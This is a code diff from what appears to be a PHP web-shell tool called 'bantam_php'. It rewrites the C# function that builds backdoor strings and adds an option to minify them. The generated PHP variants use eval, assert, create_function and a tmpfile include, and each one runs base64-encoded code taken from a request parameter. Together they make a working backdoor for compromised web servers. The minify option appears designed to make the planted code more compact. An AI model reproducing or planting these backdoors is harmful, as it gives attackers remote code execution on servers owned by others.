@@ -47,19 +47,19 @@ namespace bantam_php
             {
                 case BackdoorTypes.EVAL:
                     {
-                        backdoor = "<?php if(isset($_REQUEST['" + varName + "'])) {\r\n\t@eval(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
+                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t@eval(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.ASSERT:
                     {
-                        backdoor = "<?php if(isset($_REQUEST['" + varName + "'])) {\r\n\t@assert(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
+                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t@assert(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.CREATE_FUNCTION:
                     {
-                        backdoor = "<?php if(isset($_REQUEST['" + varName + "'])) {\r\n\t$a = @create_function(null, @urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\t$a();\r\n}";
+                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$a=@create_function(null, @urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\t$a();\r\n}";
                         break;
                     }
 
@@ -72,7 +72,7 @@ namespace bantam_php
 
                 case BackdoorTypes.TMP_INCLUDE:
                     {
-                        backdoor = "<?php\r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$tmp = tmpfile ();\r\n\t$tmpf = stream_get_meta_data($tmp);\r\n\t$tmpf = $tmpf['uri'];\r\n\tfwrite($tmp, $_REQUEST['" + varName + "']);\r\n\t$ret = include($tmpf);\r\n\tfclose($tmp);\r\n\treturn $ret;\r\n}";
+                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$fp = tmpfile();\r\n\t$tmpf=stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\tfwrite($fp, '<?php '.@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\tinclude($tmpf);\r\n\tfclose($fp);\r\n}";
                         break;
                     }
 
@@ -82,6 +82,11 @@ namespace bantam_php
                         backdoor = "";
                         break;
                     }
+            }
+
+            if (chkbxMinifyCode.Checked)
+            {
+                backdoor = PHP_Helper.minifyCode(backdoor);
             }
             return backdoor;
         }
@@ -124,6 +129,18 @@ namespace bantam_php
         private void chkbxDisableLogging_CheckStateChanged(object sender, EventArgs e)
         {
 
+        }
+
+        private void chkbxMinifyCode_CheckedChanged(object sender, EventArgs e)
+        {
+            if (chkbxMinifyCode.Checked)
+            {
+                richTextBox1.Text = PHP_Helper.minifyCode(generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex));
+            }
+            else
+            {
+                richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex);
+            }
         }
     }
 }
